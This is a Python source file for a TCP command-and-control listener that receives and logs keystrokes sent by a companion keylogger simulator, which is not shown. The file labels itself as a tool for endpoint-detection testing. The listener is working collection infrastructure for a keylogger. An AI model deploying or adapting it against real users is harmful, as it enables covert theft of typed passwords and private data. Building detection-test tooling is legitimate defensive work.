#!/usr/bin/env python3
"""
SecurMe Keylogger C2 Listener — for EDR detection testing ONLY.

Simple TCP server that receives exfiltrated keystrokes from the
KeyloggerSim WinForms app. Logs everything to console and optionally
to a file.

Usage:
    # Default (0.0.0.0:12345)
    python3 c2_listener.py

    # Custom bind
    python3 c2_listener.py --host 127.0.0.1 --port 9999

    # Log to file
    python3 c2_listener.py --log-file captured.log
"""

import argparse
import datetime
import signal
import socket
import sys
import threading


def handle_client(conn: socket.socket, addr: tuple, log_file: str | None) -> None:
    """Handle a single keylogger connection."""
    print(f"[+] {datetime.datetime.now():%H:%M:%S}  Client connected: {addr[0]}:{addr[1]}")
    buffer = ""

    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break

            text = data.decode("utf-8", errors="replace")
            buffer += text

            # Process complete lines
            while "\n" in buffer:
                line, buffer = buffer.split("\n", 1)
                line = line.strip()
                if not line:
                    continue

                ts = datetime.datetime.now().strftime("%H:%M:%S")
                output = f"[{ts}] {line}"
                print(output)

                if log_file:
                    with open(log_file, "a", encoding="utf-8") as f:
                        f.write(output + "\n")

    except (ConnectionResetError, BrokenPipeError):
        pass
    finally:
        conn.close()
        print(f"[-] {datetime.datetime.now():%H:%M:%S}  Client disconnected: {addr[0]}:{addr[1]}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="SecurMe Keylogger C2 Listener — EDR test tool"
    )
    parser.add_argument("--host", default="0.0.0.0", help="Bind address (default: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=12345, help="Bind port (default: 12345)")
    parser.add_argument("--log-file", default=None, help="Optional file to log captured keys")
    args = parser.parse_args()

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((args.host, args.port))
    server.listen(5)

    print("=" * 50)
    print("  SecurMe Keylogger C2 Listener")
    print("  FOR EDR DETECTION TESTING ONLY")
    print("=" * 50)
    print(f"  Listening on {args.host}:{args.port}")
    if args.log_file:
        print(f"  Logging to: {args.log_file}")
    print("  Press Ctrl+C to stop")
    print("=" * 50)
    print()

    # Graceful shutdown
    def shutdown(sig, frame):
        print("\n[*] Shutting down...")
        server.close()
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)

    while True:
        try:
            conn, addr = server.accept()
            t = threading.Thread(target=handle_client, args=(conn, addr, args.log_file), daemon=True)
            t.start()
        except OSError:
            break


if __name__ == "__main__":
    main()
